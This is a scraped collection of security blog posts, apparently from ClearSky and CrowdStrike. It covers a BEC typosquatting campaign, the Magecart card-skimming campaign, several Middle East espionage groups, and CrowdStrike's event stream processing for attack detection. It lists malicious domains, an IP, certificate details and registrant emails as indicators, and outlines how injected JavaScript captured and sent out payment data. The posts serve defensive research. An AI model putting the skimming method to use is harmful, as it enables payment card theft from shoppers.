9938208842966e9b7505cffec36ef19b0668843bb534d65a7568e484a7a29b28</p>
<p>Gartenmoebel24.De.docx<br />
1770de62c68d4d2325926dce555b70477a6baa02faf87384f69c5adc5ac7e514</p>
<p>Komino.Pl.doc<br />
4f2110e091a5f86e8952748e788bc0cb38905c60d91e01edcdce43047db119e6</p>
<p>Skins.Net.doc<br />
839347259d1f063e3f2b9bc09c5257ff287c1064349350a8407eb5a9188eb092</p>
<h2>Acknowledgments</h2>
<p>We would like to thank Matan Scharf of <a href=""https://cycuro.com/"">Cycuro</a> for his assistant in the investigation.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>",http://www.clearskysec.com/customer-service-centers-attacks/
Business Email Compromise fraud Against Global Shipping Companies,"<p style=""direction: ltr;"">Clearsky Security regularly monitors and tracks phishing and fraud  campaigns by looking for impersonating domain names. Recently we detected multiple domains impersonating shipping and logistics companies being registered. We suspect that these companies have become the target of Business Email Compromise scams (aka BEC or “CEO fraud”)</p>
<p>Targeted organisations include Singaporean Executive Ship Management, VersaCold (Canada’s largest supply chain company), and Tollgroup (the/ leading provider of express road-freight within Australia) and more.</p>
<p style=""direction: ltr;"">In the case of VersaCold, the malicious domain registered is versacoldl[.]com, impersonating versacold.com. In the case of Executive Ship Management, the malicious domain is executiveshlp[.]com which impersonates executiveship.com (l instead of i). And for Toll Group, tollgroup-as[.]com was registered instead of tollgroup.com.</p>
<p>This campaign targets companies in other industries as well, for example IKEA group, Amdocs, and Russian Standard (the biggest Russian Vodka brand).</p>
<p>The registrant name used in of all these domains is “Ian Stingly”, with email address ian.gold@millindrinks.com. By conducting Reverse Whois search using <a href=""http://domaintools.com/"">domaintools.com</a>, we can see other impersonating domains registered with these details (shipping and logistics companies are marked in red):</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/11/Screenshot_4.png""><img alt=""screenshot_4"" class=""alignnone size-full wp-image-1469"" height=""798"" src=""http://www.clearskysec.com/wp-content/uploads/2016/11/Screenshot_4.png"" width=""928"" /></a></p>
<p>This kind of malicious activity serves to create infrastructure for Business Email Compromise scams. These scams usually start with an email from the &#8220;CEO&#8221; to employees from a domain name similar to the real one. Between October 2013 and February 2016, the FBI received reports from 17,642 companies that lost $2.3 billion in BEC fraud.</p>
<p>Companies can mitigate this threat by :</p>
<ol>
<li>Monitoring for new domains that may impersonate the  organization and block them as soon as possible.</li>
<li>Increasing employee awareness, in various ways, including periodical training sessions and publishing advisories about the threat.</li>
</ol>
<p style=""direction: rtl;"">",http://www.clearskysec.com/bec-shipping/
Magecart – a malicious infrastructure for stealing payment details from online shops,"<p>Since March 2016, numerous credit cards and other details have been stolen during payment from dozens of online shops worldwide. Malicious JavaScript code acting as a form grabber or a simple “cloud based” keylogger was injected into breached shops. As buyers filled in their payment details, the data was captured and sent in real time to the attacker.</p>
<p>This means that the information got stolen even if the seller worked according to PCI standards and did not keep credit card details in a database after purchase completion. This method is different than other ways of stealing payment details, such as infecting the buyer&#8217;s computer, implanting malware in Point of Sale terminals, or dumping entire databases from breached online shops.</p>
<p>In this post we analyze the malicious code and other parts of the campaign. RiskIQ, who we collaborated with on the investigation, dubbed this campaign <strong>Magecart</strong>. In parallel to this post, they are publishing a <a href=""https://www.riskiq.com/blog/labs/magecart-keylogger-injection/"">report </a>reviewing other parts of the malicious infrastructure and compromised websites.</p>
<p>Security company Sucuri <a href=""http://labs.sucuri.net/?note=2016-06-30"">revealed </a>parts of this campaign back in July 30. Since, the attackers kept registering new domains and used them to host malicious JavaScript files, later injecting them into breached online shops.</p>
<h3>Malicous JavaScript injection in breached shops</h3>
<p>In order to implant the malicious JavaScript code, the attackers first had to get access to change the source code of the website. They might have gained this access by exploiting a vulnerability in the web platform (such as Magento Commerce, Powerfront CMS, OpenCar, etc’) or by getting a hold of admin credentials.</p>
<p>Then, the attacker would add a &lt;script&gt; tag, loading JavaScript from one of tens of domains they own.</p>
<p>Below are screenshots of the source code in three different breached websites, showing the injected malicious JavaScript:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/a.png""><img alt=""a"" class=""wp-image-1398 aligncenter"" height=""42"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/a-e1474970933830.png"" style=""border: 1px solid #021a40;"" width=""642"" /></a></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/ac.png""><img alt=""ac"" class="" wp-image-1401 aligncenter"" height=""65"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/ac.png"" style=""border: 1px solid #021a40;"" width=""498"" /></a></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/av.png""><img alt=""av"" class="" wp-image-1402 aligncenter"" height=""59"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/av.png"" style=""border: 1px solid #021a40;"" width=""500"" /></a></p>
<p>In order to deceive security researches, in some cases visiting the root domain or the IP to which it points would return an empty page redirecting to google.com.</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/c.png""><img alt=""c"" class=""size-full wp-image-1406 aligncenter"" height=""195"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/c.png"" style=""border: 1px solid #021a40;"" width=""498"" /></a></p>
<h3>Valid SSL certificates</h3>
<p>The malicious JavaScript code is served over HTTPS with a Valid SSL certificate. Using HTTPS is important for the attacker to keep its malicious activity undetected, because script loaded over HTTP would trigger a “mixed content” warning to the user.</p>
<p>below are some of the certificates used in the campaign:</p>
<p><strong>js-abuse[.]su</strong></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/aa-1.png""><img alt=""aa"" class=""wp-image-1419 aligncenter"" height=""182"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/aa-1.png"" style=""border: 1px solid #021a40;"" width=""411"" /></a></p>
<p>Serial : ‎00 94 6e 7c aa 678e de 0c 33 c9 ee 01 d1 ff 36 fd<br />
Sha1 Thumbprint :63 ff a2 6b b9 45 46 99 00 8f c2 ff 24 38 76 68 cf 3a 8e 93</p>
<p><strong>cdn-js[.]link</strong></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/bb.png""><img alt=""bb"" class=""wp-image-1414 aligncenter"" height=""192"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/bb.png"" style=""border: 1px solid #021a40;"" width=""412"" /></a></p>
<p>Serial : ‎ ‎00 b5 ac fc 35 dc db 7b 3b 44 3e e2 61 ba 9d d7 a1<br />
Sha1 Thumbprint :15 68 f9 67 5b c5 79 db 30 7f 52 01 dc 52 98 36 31 14 9e ef</p>
<p><strong>statsdot[.]eu</strong></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/cc.png""><img alt=""cc"" class=""wp-image-1415 aligncenter"" height=""170"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/cc.png"" style=""border: 1px solid #021a40;"" width=""411"" /></a></p>
<p>Serial : ‎ ‎ ‎03 16 90 9f 7a d1 dd c5 2f c3 5c 7a 8c f2 c8 be 40 b0<br />
Sha1 Thumbprint :‎e6 28 c2 92 8c 4e 01 f5 a0 23 c0 12 52 71 45 b6 c7 25 f5 f7</p>
<p><strong>stat-sj[.]link</strong></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/dd.png""><img alt=""dd"" class=""wp-image-1416 aligncenter"" height=""197"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/dd.png"" style=""border: 1px solid #021a40;"" width=""410"" /></a></p>
<p>Serial : ‎ ‎ ‎ 00 bd 60 18 62 e8 30 d6 17 f1 c9 b1 45 76 67 2d f8<br />
Sha1 Thumbprint :6e 6e 30 78 26 ee 2e 46 56 ad e7 bd 9e c4 71 23 d1 03 61 ac</p>
<p><strong>js-mod[.]su</strong></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/ee.png""><img alt=""ee"" class=""wp-image-1417 aligncenter"" height=""188"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/ee.png"" style=""border: 1px solid #021a40;"" width=""411"" /></a></p>
<p>Serial : ‎ ‎ ‎ 00 80 df 54 15 a6 96 99 06 20 86 4a 6b 42 e2 cf 74<br />
Sha1 Thumbprint :18 e7 aa 7b 44 bc 12 16 c0 25 75 dd 52 25 1e 4c 33 44 ef c9</p>
<p><strong>sj-mod[.]link</strong></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/ff.png""><img alt=""ff"" class=""wp-image-1418 aligncenter"" height=""196"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/ff.png"" style=""border: 1px solid #021a40;"" width=""411"" /></a></p>
<p>Serial : ‎ ‎ ‎ ‎73 07 83 4d 3b bf 49 4f 09 48 67 a8 b1 67 66 a2<br />
Sha1 Thumbprint :46 b9 73 f6 ec dc 44 4c 26 78 51 bb 20 c9 23 a1 d2 42 ff fd</p>
<h3>Credit card stealer functionality</h3>
<p>The functionality of the credit card stealer is simple. Key parts are described below.</p>
<p>After data is filled by the buyer in form fields, attributes of the fields are checked against a predefined array.  The array is composed of attributes used in the targeted payment platform, for example:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/1.png""><img alt=""1"" class=""wp-image-1424 aligncenter"" height=""53"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/1.png"" style=""border: 1px solid #021a40;"" width=""441"" /></a></p>
<p>If any of the fields are present, the value of each and every input field in the page is collected into a variable, along with the host (i.e. the web address of the form):</p>
<p><img alt=""2"" class=""wp-image-1425 aligncenter"" height=""134"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/2.png"" style=""border: 1px solid #021a40;"" width=""424"" /></p>
<p>The collected data is sent via an AJAX PSOT request to a URL in one of the malicious domains the attacker owns.</p>
<p><img alt=""3"" class=""wp-image-1426 aligncenter"" height=""202"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/3.png"" style=""border: 1px solid #021a40;"" width=""429"" /></p>
<p>Different versions of this basic code are used over the campaign. In some cases, the code is served obfuscated.</p>
<h3>Infrastructure</h3>
<p>We used PassiveTotal to pivot off of IPs (such as 80.87.205.145) and Whois details (such as a registrant email – rudneva-y@mail.ua) to find further malicious domains:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/4.png""><img alt=""4"" class=""aligncenter wp-image-1427"" height=""297"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/4.png"" style=""border: 1px solid #021a40;"" width=""421"" /></a> <a href=""http://www.clearskysec.com/wp-content/uploads/2016/09/5.png""><img alt=""5"" class=""wp-image-1428 aligncenter"" height=""619"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/5.png"" style=""border: 1px solid #021a40;"" width=""327"" /></a></p>
<p>This resulted in four clusters, sharing properties such as registrant email address and date of registration.</p>
<p><img alt=""6"" class=""wp-image-1423 aligncenter"" height=""549"" src=""http://www.clearskysec.com/wp-content/uploads/2016/09/6.png"" style=""border: 1px solid #021a40;"" width=""390"" /></p>
<p>The full list of malicious domains, compromised eCommerce websites, and other Indicators of compromise can be found at RiskIQ’s post “<a href=""https://www.riskiq.com/blog/labs/magecart-keylogger-injection/"">Compromised eCommerce Sites Lead to Web-Based Keyloggers</a>” (A <a href=""http://www.clearskysec.com/wp-content/uploads/2016/11/magecard-חשיפת-תשתית-תקיפה-של-אתרי-מסחר-אלקטרוניים-.pdf"">Hebrew version</a> is available).</p>",http://www.clearskysec.com/magecart/
Operation DustySky – Part 2,"<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/06/Operation-DustySky2_-6.2016_TLP_White.pdf""><img class=""alignright wp-image-1383 size-medium"" height=""231"" src=""http://www.clearskysec.com/wp-content/uploads/2016/06/a-300x231.jpg"" width=""300"" /></a>Operation DustySky &#8211; Part 2 is a follow-up on our <a href=""http://www.clearskysec.com/dustysky/"">DustySky operation</a> report from January 2016. It analyses new attacks by Molerats against targets in Israel, The United States, Egypt, Saudi Arabia, United Arab Emirates and The Palestinian Authority.</p>
<p>We elaborate on the scope and targeting of the DustySky campaign and expose new infrastructure and incidents. In addition, we expose the identity of an individual who is behind the DustySky campaign. Following the previous report, this individual has contacted us trying to learn what we know about him.</p>
<p>Attacks against all targets in the Middle East stopped at once after we published the first report. However, the attacks against targets in the Middle East (except Israel) were renewed in less than 20 days. In the beginning of April 2016, we found evidence that the attacks against Israel have been renewed as well.</p>
<p>Based on the type of targets, on Gaza being the source of the attacks, and on the type of information the attackers are after &#8211; we estimate with medium-high certainty that the Hamas terrorist organization is behind these attacks.</p>
<p><strong>Read the full report:</strong> <a href=""http://www.clearskysec.com/wp-content/uploads/2016/06/Operation-DustySky2_-6.2016_TLP_White.pdf"">Operation DustySky</a><br />
<strong>Indicators file:</strong> <a href=""http://www.clearskysec.com/wp-content/uploads/2016/06/DusySky2-indicators.xlsx"">DusySky2-indicators</a> (also available on <a href=""https://www.passivetotal.org/tag/dustysky"">PassiveTotal</a>)</p>
<p>If you have been targeted with DustySky, or have questions about the report, please contact us at:<br />
info[at]clearskysec.com</p>
<h3>Acknowledgments</h3>
<p>This research was facilitated by the <a href=""https://www.passivetotal.org"">PassiveTotal </a>for threat infrastructure analysis.<br />
We would like to thank the security researchers and organizations who shared information and provided feedback, which have been crucial for this research.</p>
<p>&nbsp;</p>",http://www.clearskysec.com/dustysky2/
Operation DustySky,"<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/01/Operation%20DustySky_TLP_WHITE.pdf"" rel=""attachment wp-att-1369""><img alt=""Capture"" class=""alignright wp-image-1369 size-medium"" height=""270"" src=""http://www.clearskysec.com/wp-content/uploads/2016/01/Capture-300x270.png"" width=""300"" /></a>DustySky (called “NeD Worm” by its developer) is a multi-stage malware in use since May 2015. It is in use by the Molerats (aka Gaza cybergang), a politically motivated group whose main objective, we believe, is intelligence gathering.  Operating since 2012, the group&#8217;s activity has been reported by Norman <sup>[1]</sup>, Kaspersky<sup>[2] [3]</sup>, FireEye<sup>[4]</sup>, and PwC<sup>[5]</sup>.</p>
<p>This report revolves around a campaign that includes a new malware developed by a member of the group or on behalf of the group. Based on dozens of known attacks and the vast infrastructure in use &#8211; we estimate that a wave of targeted malicious email messages has been sent on a weekly basis.</p>
<p>These attacks are targeted, but not spear-phished. I.e., malicious email messages are sent to selected targets rather than random mass distribution, but are not tailored specifically to each and every target. Dozens of targets may receive the exact same message. The email message and the lure document are written in Hebrew, Arabic or English &#8211; depending on the target audience.</p>
<p>Targeted sectors include governmental and diplomatic institutions, including embassies; companies from the aerospace and defence Industries; financial institutions; journalists; software developers.</p>
<p>The attackers have been targeting software developers in general, using a fake website pretending to be a legitimate iOS management software, and linking to it in an online freelancing marketplace.</p>
<p>Most targets are from the Middle East: Israel, Egypt, Saudi Arabia, United Arab Emirates and Iraq. The United States and countries in Europe are targeted as well.</p>
<p><strong>Read the full report: <a href=""http://www.clearskysec.com/wp-content/uploads/2016/01/Operation DustySky_TLP_WHITE.pdf"" target=""_blank"">Operation DustySky</a></strong><br />
<strong>Indicators file: <a href=""http://www.clearskysec.com/wp-content/uploads/2016/01/DusySky-indicators.xlsx"" target=""_blank"">DusySky-indicators.xlsx</a>  </strong>(DustySky indicators are tagged as such in PassiveTotal)<strong><br />
</strong></p>
<p>If you have been targeted with DustySky, or have questions about the report, please contact us at:<br />
<strong>info[at]clearskysec.com</strong></p>
<p>Also see &#8220;<a href=""http://blog.passivetotal.org/operation-dustysky-notes/"" target=""_blank"">Operation DustySky Notes</a>&#8221; by PassiveTotal for further discussion about the malicious infrastructure.</p>
<h3>Acknowledgments</h3>
<p>We would like to thank our colleagues for their ongoing information sharing and feedback, which have been crucial for this research: security researcher Infra; <a href=""https://www.passivetotal.org"">PassiveTotal</a> analyst team; Tom Lancaster of <a href=""http://pwc.blogs.com/cyber_security_updates/tom-lancaster/"">PwC</a> ;<a href=""http://www.team-cymru.org/"">Team Cymru</a>; Security researcher <a href=""https://www.researchgate.net/profile/Sebastian_Garcia6"">Sebastián García</a>; Menachem Perlman of LightCyber; Other security researchers who wish to remain anonymous.</p>
<p><a href=""http://www.clearskysec.com/feed/#_ftnref1"" name=""_ftn1"">[1]</a> <a href=""https://github.com/kbandla/APTnotes/blob/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf"">https://github.com/kbandla/APTnotes/blob/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf</a></p>
<p><a href=""http://www.clearskysec.com/feed/#_ftnref2"" name=""_ftn2"">[2]</a> <a href=""http://www.seculert.com/blog/2014/01/xtreme-rat-strikes-israeli-organizations-again.html"">http://www.seculert.com/blog/2014/01/xtreme-rat-strikes-israeli-organizations-again.html</a></p>
<p><a href=""http://www.clearskysec.com/feed/#_ftnref3"" name=""_ftn3"">[3]</a> <a href=""https://securelist.com/blog/research/72283/gaza-cybergang-wheres-your-ir-team"">https://securelist.com/blog/research/72283/gaza-cybergang-wheres-your-ir-team</a></p>
<p><a href=""http://www.clearskysec.com/feed/#_ftnref4"" name=""_ftn4"">[4]</a> <a href=""https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html"">https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html</a></p>
<p><a href=""http://www.clearskysec.com/feed/#_ftnref5"" name=""_ftn5"">[5]</a> <a href=""http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html"">http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html</a></p>",http://www.clearskysec.com/dustysky/
Report: The CopyKittens are targeting Israelis,"<p><strong><img alt=""Copykittens"" class=""alignright wp-image-1339 size-medium"" height=""212"" src=""http://www.clearskysec.com/wp-content/uploads/2015/11/Copykittens-300x212.png"" width=""300"" />CopyKittens</strong> is an espionage group that has been attacking Israeli targets since at least August 2014. Among the targets are high ranking diplomats at Israel’s Ministry of Foreign Affairs and well-known Israeli academic researchers specializing in Middle East Studies.</p>
<p><strong>Matryoshka</strong> is the name we gave the malware built by CopyKittens. It is a multi-stage framework, with each part integrates into the subsequent one. CopyKittens assembled Matryoshka from code snippets picked from public repositories and online forums, hence their nickname.</p>
<p>Matryoshka is spread through spear phishing with a document attached to it. The document has either a malicious macro that the victim is asked to enable, or an embedded executable the victim is asked to open.</p>
<p>DNS requests and answers are used for command and control communication and for data exfiltration.</p>
<p>Based on the type of targets, delivery, and malware used &#8211; we estimate that CopyKittens are a state actor or are endorsed by one.</p>
<p>This report was produced by <a href=""http://www.minerva-labs.com/"">Minerva labs</a> and ClearSky.</p>
<p><strong>Read the full report: <a href=""https://s3-eu-west-1.amazonaws.com/minervaresearchpublic/CopyKittens/CopyKittens.pdf"">The CopyKittens attack group.</a></strong></p>",http://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/
Rocket Kitten 2 – follow-up on Iran originated cyber-attacks,"<p>In the past few months ClearSky and Trend Micro have been monitoring  and analyzing the Iranian cyber-attack group known as &#8220;Rocket Kitten&#8221;. The following report uncovers new attacks performed by the group, its methods and operations.</p>
<p>Rocket Kitten has been operating since at least mid-2014. The group operates against numerous targets in the middle-east including Israelis, Iranian exiles, and enemies of Iran. The targets are researchers and practitioners in the fields of policy, government and international relations, security, defense, journalism, human rights, and others.</p>
<p>The group heavily relies on social engineering, and it is persistent and targeted. Each target is repeatedly attacked using a variety of techniques, such as phone calls, SMS messages, Facebook messages, dedicated phishing websites, and spear phishing.</p>
<p>Our research suggests that the group&#8217;s intention is to obtain sensitive information and perform espionage, as they are ideologically motivated.</p>
<p>Previous reports about Rocket Kitten include ClearSky&#8217;s <a href=""http://www.clearskysec.com/gholee-a-protective-edge-themed-spear-phishing-campaign/"">Gholee </a>and &#8220;<a href=""http://www.clearskysec.com/thamar-reservoir/"">Thamar Reservoir</a>&#8220;, and  Trend Micro&#8217;s <a href=""http://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-woolen-goldfish-when-kittens-go-phishing"">Operation Woolen-Goldfish</a>.  Last week Citizen Lab published <a href=""https://citizenlab.org/2015/08/iran_two_factor_phishing/"">Two-Factor Authentication Phishing From Iran</a>. The  group was analyzed in a <a href=""https://www.youtube.com/watch?v=WIhKovlHDJ0"">presentation </a>at the Chaos Communication Congress (CCC).</p>
<p>The new joint report – &#8220;Rocket Kitten 2&#8221; includes incidents from the pass few months, among them one in which the group tried to impersonate a Clearsky analyst and attempted to infect the target by usurping Trend Micro HouseCall.</p>
<p>The report includes the following sections:</p>
<ul>
<li>Rocket Kitten attacker profile</li>
<li>The group&#8217;s targets and goals</li>
<li>Tactics and tools</li>
<li>Case studies</li>
<li>Safety measures and recommendations</li>
</ul>
<p><strong>Read the full report: <a href=""http://documents.trendmicro.com/assets/wp/wp-the-spy-kittens-are-back.pdf"">The Kittens Strike Back: Rocket Kitten Continues Attacks on Middle East Targets</a></strong></p>",http://www.clearskysec.com/rocket-kitten-2/
Thamar Reservoir – An Iranian cyber-attack campaign against targets in the Middle East,"<p>This report reviews an ongoing cyber-attack campaign dating back to mid-2014. Additional sources indicate it may date as far back as 2011. We call this campaign <strong>Thamar Reservoir, </strong>named after one of the targets, Thamar E. Gindin, who exposed new information about the attack and is currently assisting with the investigation.</p>
<p>The campaign includes several different attacks with the aim of taking over the target’s computer or gain access to their email account. We estimate that this access is used for espionage or other nation-state interests, and not for monetary gain or hacktivism. In some cases, the victim is not the final target; the attackers use the infected computer, email, or stolen credentials as a platform to further attack their intended target.</p>
<p>The attackers are extremely persistent in their attempts to breach their targets.  These attempts include:</p>
<ul>
<li>Breaching trusted websites to set up fake pages</li>
<li>Multi-stage malware</li>
<li>Multiple spear phishing emails based on reconnaissance and information gathering.</li>
<li>Phone calls to the target.</li>
<li>Messages on social networks.</li>
</ul>
<p>While very successful in their attacks &#8211; the attackers are clearly not technically sophisticated. They are not new to hacking, but do make various mistakes &#8211; such as grammatical errors, exposure of attack infrastructure, easy to bypass anti analysis techniques, lack of code obfuscation, and more.</p>
<p>These mistakes enabled us to learn about their infrastructure and methods. More importantly, we have learned of 550 targets, most of them in the Middle East, from various fields: research about diplomacy,  Middle East and Iran, international relations, and other fields; Defense and security; Journalism and human rights; and more.</p>
<p>Below is the target distribution by country (click the image for full size):</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2015/06/Country-distribution2.png""><img alt=""Country distribution"" class=""alignnone  wp-image-1227"" height=""336"" src=""http://www.clearskysec.com/wp-content/uploads/2015/06/Country-distribution2-300x297.png"" width=""339"" /></a></p>
<p><span style=""line-height: 1.5;"">Various characteristics of the attacks and their targets bring us to the conclusion that the threat actors are Iranian. In addition, we note that these attacks share characteristics with previously documented activities:</span></p>
<ul>
<li>Attacks conducted using the Gholee malware, which we discovered.</li>
<li>Attacks reported by Trend Micro in Operation Woolen-Goldfish.</li>
<li>Attacks conducted by the Ajax Security Team as documented by FireEye.</li>
<li>Attacks seen during Newscaster as documented by iSight.</li>
</ul>
<p><strong>Read the full report: <a href=""http://www.clearskysec.com/wp-content/uploads/2015/06/Thamar-Reservoir-public1.pdf"" target=""_blank"">Thamar Reservoir &#8211; An Iranian cyber-attack campaign against targets in the Middle East</a></strong></p>",http://www.clearskysec.com/thamar-reservoir/
Understanding Indicators of Attack (IOAs): The Power of Event Stream Processing in CrowdStrike Falcon,"<p>Event Stream Processing (ESP) has been a central component of CrowdStrike Falcon’s IOA approach since CrowdStrike&#8217;s inception.  In this post we&#8217;ll take a closer look at ESP — along with its utility and challenges — in an endpoint protection platform like CrowdStrike Falcon.</p>
<p>ESP is really a category of approaches, with a subset of those approaches being commonly referred to as Complex Event Processing (CEP).  Leveraging ESP in the information security space is an approach that has been evaluated in various forms, at least academically, since at least as far back as the 1990&#8217;s.  Basically, ESP can be contrasted with systems that use retrospective, or &#8220;offline&#8221; analysis methods, such as table-based queries commonly associated with SQL, Splunk, and cloud technologies such as column-oriented databases.  For systems intended to identify patterns in a stream of events, retrospective queries are inefficient – frequently requiring that redundant computations be performed repeatedly.  ESP’s intent is to answer the same questions as offline retrospective querying, but by using more efficient <a href=""https://en.wikipedia.org/wiki/Online_algorithm"">&#8220;online” algorithms</a>, which do not require access to an entire and finite data set in order to perform useful analysis.</p>
<p>Here is an example.  Suppose you have a stream of process creation events from endpoint sensors.  Each event might contain information such as:</p>
<ul>
<li>Identifier for the machine</li>
<li>Identifier for the process</li>
<li>Identifier for the parent process</li>
<li>Filename of the created process&#8217; executable filename</li>
</ul>
<p>Given just that information, one could find all occurrences where an Internet Explorer process spawned a command shell.  With a retrospective query system like SQL, we would need a nested query that first finds all process instances where<em> ImageFileName==&#8217;cmd.exe&#8217;</em>, and then joins that result set with another query on<em> ImageFileName==&#8217;iexplore.exe&#8217;</em>, and where <em>ParentProcessId==ProcessId</em>.  This search is obviously inefficient, since we must make two passes through the data.  What’s worse, doing this retrospectively with a standing query requires a huge amount of unnecessarily redundant computation.  In contrast, ESP provides a much more efficient approach by statefully holding onto only relevant data, and then correlating later events with that information.</p>
<p>One straightforward ESP-based approach would be to store each instance of iexplore.exe as it is observed on the endpoint, hanging onto that knowledge for later correlation.  When an instance of cmd.exe is observed, we can take the ParentProcessId of the new event and compare it with the current set of saved iexplore.exe ProcessIds.  This approach is clearly more efficient than the retrospective query.  This example is highly simplified.  There are many approaches that can be classified as ESP, but this stateful correlation approach is a straightforward starting point to explain the concept.</p>
<p>Keep in mind that while ESP is a very useful tool, it is not, by itself, a breakthrough technology.  However, while ESP itself is not challenging in theory, there are many challenges in making a robust ESP-based commercial solution.  Two important ones are scale and efficiency.</p>
<p>While CrowdStrike Falcon is perhaps best known for its class-leading cloud technology, an important and often overlooked aspect of its platform is the endpoint sensor itself.  Being able to efficiently perform ESP correlation on the sensor (and in the kernel!)  is unique in the industry. By performing ESP on sensors, in addition to correlation that happens in the cloud, the CrowdStrike Falcon platform can operate on data at scales that are <a href=""https://www.crowdstrike.com/blog/what-sets-crowdstrike-falcon-host-apart/"">too prohibitive</a> to achieve by centralizing all of the data.  For example, while CrowdStrike Falcon gathers and processes a <em>lot </em> of data proactively in the cloud, sending all registry read operations to the cloud would multiply the data transmission, storage, and computational costs by perhaps 1000X.  And registry reads are useful for ESP correlation. Clearly, having to first centralize all data before being able to correlate it is the wrong approach.  Yet somehow, that bottleneck-laden approach is still common practice.</p>
<p>However, simply &#8220;doing ESP&#8221; — even when correlation is done on the endpoint — is still not sufficient to create a detection and prevention platform that is truly “next-generation.”  Another important consideration is the nature of the events themselves, because details matter.  CrowdStrike Falcon sensor has access to over 1,000 types of events, many of which provide the sensor with data that is entirely unique in the industry, resulting in a detection and prevention capability that is second to none.  These events indicate activity ranging from simple file I/O operations to privilege escalation.  Behavioral IOA correlation ties these together to detect and prevent malicious activity.  The result is technology sophisticated enough to detect when credential theft is occurring from a reflectively injected module in PowerShell, and to prevent that activity before it can actually be observed by the attacker.</p>
<div class=""wp-caption aligncenter"" id=""attachment_18622"" style=""width: 784px;""><img alt=""CrowdStrike Falcon UI showing an example of a process tree with IOAs indicating malicious behavior related to a document exploit (in this case, a PDF opened in Adobe Acrobat Reader).  The green arrow indicates code injection.  (Other symbols indicate whether the processes are engaged in file and network operations.  The plus or minus symbols are for collapsing/expanding parts of the process tree.)"" class=""size-full wp-image-18622"" height=""340"" src=""https://www.crowdstrike.com/blog/wp-content/uploads/2017/03/Falcon-UI.png"" width=""774"" /><p class=""wp-caption-text"">CrowdStrike Falcon UI showing an example of a process tree with IOAs indicating malicious behavior related to a document exploit (in this case, a PDF opened in Adobe Acrobat Reader).  The green arrow indicates code injection.  (Other symbols indicate whether the processes are engaged in file and network operations.  The plus or minus symbols are for collapsing/expanding parts of the process tree.)</p></div>
<p>Another significant challenge that faces a would-be adopter of ESP is the question, &#8220;Where do ESP patterns come from?&#8221;  Just relying on what you know from coarse-grained, centralized data is not enough to illuminate what behaviors distinguish malicious software from benign.  Human insight combined with sophisticated analytical methods and data gathering techniques are required.  This synthesis of human-computer effort also enables CrowdStrike to leverage machine learning methods to further accelerate the pace and accuracy of IOA development.  Perhaps one day the need for human insight may be eliminated from the process of developing ESP-based IOAs.  And perhaps in that Utopian future, when my job has been completely automated, I will be able to once again find gainful employment blogging about security.</p>
<p>Of course, some data outside of ESP is still useful to send to humans for analysis.  This data helps expert threat hunters in CrowdStrike&#8217;s OverWatch group find new ways of detecting malicious behavior and malware.  As one example among many, CrowdStrike&#8217;s platform proactively collects all information about inter-process activity — including data that is completely unique in the industry — and makes it all available to analysts. Using that data, OverWatch threat hunters can perform additional analysis that culminates in deploying new IOAs into the product rapidly through the cloud, automating detection of newly discovered behaviors and malware.  The number of different ways that the resulting platform can detect instances of malicious behavior is striking.</p>
<p>So to do ESP right you need:</p>
<ol>
<li>An excellent data collection platform,</li>
<li>A highly optimized sensor capable of providing those events without impacting users or server performance, and</li>
<li>An agile and mature IOA development pipeline that starts with world-class adversary hunters.</li>
</ol>
<p>There are other methods for identifying malicious behavior under the IOA umbrella besides ESP,  and more are being added every day to the list of methods under active research at CrowdStrike.  Combining human expertise in information security with ESP technology has long been and will remain a core component of CrowdStrike’s approach, making the company a technology leader in the endpoint protection space.  CrowdStrike pioneered the use of ESP in the Endpoint Protection Platform market, and it will be unsurprising if others try to imitate CrowdStrike&#8217;s approach, given its success.</p>
<p>Perhaps the most obvious evidence of this leadership is the simple fact that, unlike others in the industry, CrowdStrike&#8217;s IOA philosophy, message, and technical approach have remained consistent over the years and been well proven by withstanding the test of time.</p>
<p>To learn more about CrowdStrike’s pioneering work in IOA behavioral detection, please read the whitepaper: <a href=""https://www.crowdstrike.com/resources/white-papers/indicators-attack-vs-indicators-compromise/""><em>Indicators of Attack Vs. Indicators of Compromise</em></a>.</p>
<p>&nbsp;</p>
